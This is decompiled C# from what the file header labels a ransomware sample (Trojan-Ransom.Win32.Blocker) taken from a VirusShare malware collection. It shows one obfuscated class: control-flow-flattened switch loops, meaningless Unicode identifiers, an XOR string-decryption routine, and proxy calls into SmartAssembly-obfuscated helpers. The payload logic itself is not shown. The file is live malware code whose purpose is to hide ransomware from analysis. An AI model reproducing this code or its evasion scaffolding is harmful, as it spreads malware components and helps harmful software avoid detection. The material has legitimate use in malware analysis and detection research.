// Decompiled with JetBrains decompiler
// Type: .
// Assembly: yzalr14k, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73F4068F-A403-47FB-B5CB-C14B2659D9D3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jvnh-1a7b6e0d12ac2336ab057d2b6e6b7694d384e5bc974736cb0a175e5c77f3e4e4.exe

using \u0008;
using Microsoft.VisualBasic.ApplicationServices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using Ⴐ;

namespace \u0008
{
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Never)]
  internal sealed class \u0001 : ApplicationBase
  {
    private static readonly char[] Ⴓ;
    private static readonly char[] Ⴍ;
    private static readonly string[] Ⴐ;
    internal static \u0001.Ⴍ Ⴍ;

    static \u0001()
    {
      int num = 3;
      char[] chArray;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            chArray[0] = '⛄';
            chArray[4] = '╎';
            chArray[6] = '㕌';
            num = 6;
            continue;
          case 2:
            num = 1;
            continue;
          case 4:
            chArray[7] = 'ᖨ';
            goto case 5;
          case 5:
            chArray[5] = 'ᣇ';
            chArray[2] = '㲜';
            goto case 2;
          case 6:
            goto label_7;
          default:
            \u0001.Ⴍ = new char[8]
            {
              char.MinValue,
              '\u0005',
              char.MinValue,
              '⛩',
              'ሠ',
              '㲭',
              'ʨ',
              '┌'
            };
            chArray = new char[8]
            {
              char.MinValue,
              char.MinValue,
              char.MinValue,
              'ʑ',
              char.MinValue,
              char.MinValue,
              char.MinValue,
              char.MinValue
            };
            num = 4;
            continue;
        }
      }
label_7:
      chArray[1] = 'ሕ';
      \u0001.Ⴐ = new string[1];
      \u0001.Ⴓ = chArray;
      Ⴅ.Ⴓ();
    }

    internal static Encoding Ⴀ(int Ⴈ, int Ⴃ)
    {
label_3:
      int num1 = 10;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 2:
          case 9:
            goto label_3;
          case 1:
            num2 = 5;
            num1 = 7;
            continue;
          case 3:
            num2 = 5;
            num1 = 7;
            continue;
          case 4:
            num3 = 1;
            break;
          case 5:
label_22:
            num1 = 7;
            continue;
          case 7:
            int num4;
            switch (num2)
            {
              case 0:
                num4 = 11;
                break;
              case 1:
                num4 = 3;
                break;
              case 2:
                num4 = 8;
                break;
              case 3:
                num4 = 1;
                break;
              case 4:
                num4 = 3;
                break;
              case 5:
                num4 = 10;
                break;
              case 6:
                num4 = 11;
                break;
              case 7:
                num4 = 11;
                break;
              default:
                num4 = 8;
                break;
            }
            num1 = num4;
            continue;
          case 8:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\u0001.Ⴀ);
            num2 = 5;
            num1 = 7;
            continue;
          case 10:
            int num5;
            switch (Ⴃ ^ Ⴈ)
            {
              case 31:
                num5 = 12;
                break;
              default:
                num5 = 4;
                break;
            }
            num1 = num5;
            continue;
          case 11:
            goto label_25;
          case 12:
            num3 = 0;
            break;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\u0001.Ⴀ);
            num1 = 9;
            continue;
        }
        num2 = num3;
        goto label_22;
      }
label_25:
      return \u0002.Ⴐ.Ⴄ.Ⴓ(559, 566);
    }

    internal static Decimal Ⴀ(Decimal Ⴀ, Decimal Ⴃ, int Ⴐ, int Ⴈ)
    {
label_3:
      int num1 = 5;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            goto label_3;
          case 2:
            int num4;
            switch (num2)
            {
              case 0:
                num4 = 5;
                break;
              case 1:
                num4 = 9;
                break;
              case 2:
                num4 = 8;
                break;
              case 3:
                num4 = 10;
                break;
              case 4:
                num4 = 10;
                break;
              case 5:
                num4 = 10;
                break;
              case 6:
                num4 = 5;
                break;
              case 7:
                num4 = 6;
                break;
              default:
                num4 = 6;
                break;
            }
            num1 = num4;
            continue;
          case 3:
label_22:
            num1 = 2;
            continue;
          case 4:
          case 7:
            num1 = 2;
            continue;
          case 5:
            int num5;
            switch (Ⴈ ^ Ⴐ)
            {
              case 56:
                num5 = 12;
                break;
              default:
                num5 = 11;
                break;
            }
            num1 = num5;
            continue;
          case 6:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\u0001.Ⴀ);
            num2 = 0;
            num1 = 2;
            continue;
          case 8:
            num2 = 0;
            goto case 4;
          case 9:
            num2 = 0;
            num1 = 2;
            continue;
          case 10:
            goto label_26;
          case 11:
            num3 = 2;
            break;
          case 12:
            num3 = 5;
            break;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\u0001.Ⴀ);
            num1 = 0;
            continue;
        }
        num2 = num3;
        goto label_22;
      }
label_26:
      return \u0002.Ⴐ.Ⴄ.Ⴈ(Ⴀ, Ⴃ, 109, 113);
    }

    internal static Color Ⴀ(int Ⴀ, int Ⴐ, int Ⴃ, int Ⴍ, int Ⴗ, int Ⴈ)
    {
label_3:
      int num1 = 4;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 1:
            num3 = 4;
            break;
          case 2:
            num2 = 6;
            num1 = 11;
            continue;
          case 3:
            goto label_24;
          case 4:
          case 12:
            int num4;
            switch (Ⴈ ^ Ⴗ)
            {
              case 121:
                num4 = 10;
                break;
              default:
                num4 = 1;
                break;
            }
            num1 = num4;
            continue;
          case 5:
          case 7:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\u0001.Ⴀ);
            num2 = 6;
            num1 = 11;
            continue;
          case 6:
          case 9:
            goto label_3;
          case 8:
            num2 = 6;
            num1 = 11;
            continue;
          case 10:
            num3 = 0;
            break;
          case 11:
            int num5;
            switch (num2)
            {
              case 0:
                num5 = 3;
                break;
              case 1:
                num5 = 3;
                break;
              case 2:
                num5 = 7;
                break;
              case 3:
                num5 = 3;
                break;
              case 4:
                num5 = 2;
                break;
              case 5:
                num5 = 8;
                break;
              case 6:
                num5 = 4;
                break;
              case 7:
                num5 = 4;
                break;
              default:
                num5 = 7;
                break;
            }
            num1 = num5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\u0001.Ⴀ);
            num1 = 6;
            continue;
        }
        num2 = num3;
        num1 = 11;
      }
label_24:
      return \u0002.Ⴐ.Ⴍ(Ⴀ, Ⴐ, Ⴃ, Ⴍ, 751, 696);
    }

    internal static ParameterInfo[] Ⴓ(MethodBase Ⴀ, int Ⴅ, int Ⴐ)
    {
label_3:
      int num1 = 10;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 11:
            num3 = 1;
            break;
          case 1:
          case 10:
            int num4;
            switch (Ⴐ ^ Ⴅ)
            {
              case 61:
                num4 = 0;
                break;
              default:
                num4 = 6;
                break;
            }
            num1 = num4;
            continue;
          case 2:
            goto label_24;
          case 3:
          case 5:
            num2 = 6;
            num1 = 7;
            continue;
          case 6:
            num3 = 5;
            break;
          case 7:
            int num5;
            switch (num2)
            {
              case 0:
                num5 = 9;
                break;
              case 1:
                num5 = 2;
                break;
              case 2:
                num5 = 9;
                break;
              case 3:
                num5 = 9;
                break;
              case 4:
                num5 = 2;
                break;
              case 5:
                num5 = 8;
                break;
              case 6:
                num5 = 10;
                break;
              case 7:
                num5 = 5;
                break;
              default:
                num5 = 9;
                break;
            }
            num1 = num5;
            continue;
          case 8:
            num2 = 6;
            num1 = 7;
            continue;
          case 9:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (\u0001.Ⴓ);
            num2 = 6;
            num1 = 7;
            continue;
          case 12:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (\u0001.Ⴓ);
            num1 = 12;
            continue;
        }
        num2 = num3;
        num1 = 7;
      }
label_24:
      return \u0002.Ⴐ.Ⴅ(Ⴀ, 142, 213);
    }

    internal static string Ⴃ(int Ⴗ, int Ⴄ)
    {
label_3:
      int index1 = Ⴗ ^ 1528405422 ^ Ⴄ;
      char[] ⴍ = \u0001.Ⴍ;
      int index2 = (int) ⴍ[index1];
      int num1 = 5;
      string str1;
      int length1;
      char[] chArray;
      char[] ⴓ;
      int length2;
      int index3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 9:
          case 11:
            goto label_3;
          case 1:
            ⴓ = \u0001.Ⴓ;
            length2 = ⴓ.Length;
            index1 += 3;
            num1 = 12;
            continue;
          case 2:
            int num2 = (int) ⴍ[index1 + 1];
            length1 = ((int) ⴍ[index1 + 2] << 16) + num2;
            num1 = 13;
            continue;
          case 3:
            chArray[index3] = (char) ((uint) ⴍ[index1 + index3] ^ (uint) ⴓ[(index3 + index2) % length2]);
            num1 = 10;
            continue;
          case 5:
            num1 = (str1 = \u0001.Ⴐ[index2]) == null ? 2 : 6;
            continue;
          case 6:
            goto label_5;
          case 7:
            goto label_13;
          case 8:
            num1 = index3 < length1 ? 3 : 7;
            continue;
          case 10:
            index3 = 1 + index3;
            num1 = 8;
            continue;
          case 12:
            index3 = 0;
            num1 = 8;
            continue;
          case 13:
            chArray = new char[length1];
            goto case 1;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0001.Ⴃ);
            num1 = 0;
            continue;
        }
      }
label_5:
      return str1;
label_13:
      string str2 = new string(chArray);
      \u0001.Ⴐ[index2] = str2;
      return str2;
    }

    internal static Assembly Ⴓ(int Ⴀ, int Ⴓ)
    {
label_3:
      int num1;
      switch (Ⴓ ^ Ⴀ)
      {
        case 87:
          num1 = 6;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            num2 = 2;
            continue;
          case 2:
          case 7:
            goto label_3;
          case 3:
          case 4:
            num2 = 2;
            continue;
          case 6:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0001.Ⴓ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴅ(618, 599);
    }

    internal static AppDomain Ⴈ(int Ⴐ, int Ⴓ)
    {
label_3:
      int num1;
      switch (Ⴓ ^ Ⴐ)
      {
        case 70:
          num1 = 2;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
          case 4:
            goto label_8;
          case 1:
            goto label_3;
          case 3:
          case 5:
            num2 = 1;
            continue;
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0001.Ⴈ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return \u0002.Ⴐ.Ⴄ.Ⴀ(172, 217);
    }

    internal static void Ⴓ(AppDomain Ⴃ, string Ⴈ, object Ⴗ, int Ⴐ, int Ⴄ)
    {
      int num1 = 3;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 4:
            goto label_7;
          case 2:
            goto label_9;
          case 5:
            num1 = 3;
            continue;
          default:
            int num2;
            switch (Ⴄ ^ Ⴐ)
            {
              case 49:
                num2 = 4;
                break;
              case 50:
                goto label_8;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_9:
      return;
label_7:
      SmartAssembly.Attributes.Ⴓ.Ⴅ(Ⴃ, Ⴈ, Ⴗ, 526, 621);
      return;
label_8:
      Ⴃ.SetData(Ⴈ, Ⴗ);
    }

    internal static Evidence Ⴃ(Assembly Ⴃ, int Ⴀ, int Ⴗ)
    {
label_3:
      int num1;
      switch (Ⴗ ^ Ⴀ)
      {
        case 92:
          num1 = 5;
          break;
        default:
          num1 = 1;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
          case 7:
            goto label_3;
          case 1:
            num2 = 0;
            continue;
          case 3:
            num2 = 0;
            continue;
          case 5:
          case 6:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0001.Ⴃ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return SmartAssembly.Attributes.Ⴓ.Ⴈ(Ⴃ, 541, 528);
    }

    internal static string[] Ⴈ(Assembly Ⴓ, int Ⴗ, int Ⴀ)
    {
label_3:
      int num1;
      switch (Ⴀ ^ Ⴗ)
      {
        case 101:
          num1 = 3;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 4:
            goto label_3;
          case 2:
            num2 = 0;
            continue;
          case 3:
          case 7:
            goto label_8;
          case 5:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0001.Ⴈ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return \u0002.Ⴐ.Ⴀ(Ⴓ, 219, 218);
    }

    [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
    private struct Ⴍ
    {
    }
  }
}
